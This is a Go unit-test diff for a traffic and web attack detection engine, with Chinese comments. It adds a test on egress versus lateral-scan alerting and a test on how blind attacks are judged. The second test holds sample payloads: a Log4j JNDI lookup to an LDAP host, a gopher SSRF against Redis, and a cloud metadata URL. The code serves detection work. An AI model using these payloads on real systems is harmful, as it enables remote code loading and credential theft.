@@ -1,6 +1,7 @@
 package detect
 
 import (
+	"fmt"
 	"testing"
 	"time"
 
@@ -236,5 +237,44 @@ func TestBehaviorIgnoresFutureTime(t *testing.T) {
 	}
 	if _, ok := b.web["198.51.100.2"]; !ok {
 		t.Fatal("正常窗口不应被清理")
+	}
+}
+
+// 内网主机访问公网的出站流量（设备日志未标注方向）不判为扫描、洪泛或暴力破解；内网之间的横向扫描仍检测。
+func TestBehaviorIgnoresEgress(t *testing.T) {
+	th := config.Default().Detect.Thresholds
+	b := NewBehavior(th)
+	now := time.Now()
+	for i := 0; i < 2000; i++ {
+		ev := &model.Event{Kind: model.KindFirewall, SrcIP: "10.0.0.45", DstIP: fmt.Sprintf("93.184.%d.%d", i/250, i%250+1),
+			DstPort: []int{443, 80, 22, 3389, 8443}[i%5] + i%40, Action: model.ActionAllow, Time: now}
+		if hits := b.Observe(ev); len(hits) > 0 {
+			t.Fatalf("正常上网的出站流量不应告警: %+v", hits)
+		}
+	}
+	var lateral []model.Hit
+	for i := 0; i < th.HostSweep+5; i++ {
+		lateral = append(lateral, b.Observe(&model.Event{Kind: model.KindFirewall, SrcIP: "10.0.0.45", DstIP: fmt.Sprintf("10.0.1.%d", i+1),
+			DstPort: 445, Action: model.ActionDeny, Time: now})...)
+	}
+	if len(lateral) == 0 || lateral[0].Category != CatHostSweep {
+		t.Fatalf("内网横向扫描应告警: %+v", lateral)
+	}
+	if !IsEgress(&model.Event{Kind: model.KindFirewall, SrcIP: "192.168.1.5", DstIP: "1.1.1.1"}) ||
+		IsEgress(&model.Event{Kind: model.KindFirewall, SrcIP: "1.1.1.1", DstIP: "192.168.1.5"}) ||
+		IsEgress(&model.Event{Kind: model.KindWeb, SrcIP: "192.168.1.5"}) {
+		t.Fatal("出站判断错误")
+	}
+}
+
+// 盲打 / 带外利用类攻击（Log4j、SSRF、XXE、反序列化）返回 200 无法说明成功，研判为未拦截。
+func TestBlindAttackNotSuccess(t *testing.T) {
+	e, _ := NewEngine("", 1)
+	for _, uri := range []string{"/?x=${jndi:ldap://198.51.100.9:1389/a}", "/fetch?url=gopher://127.0.0.1:6379/_INFO", "/img?src=http://169.254.169.254/latest/meta-data/"} {
+		for _, h := range e.Inspect(web("GET", uri, 200, "x")) {
+			if !h.TagOnly && h.Result == model.ResultSuccess {
+				t.Errorf("%s 命中 %s 不应研判为疑似成功", uri, h.RuleID)
+			}
+		}
 	}
 }
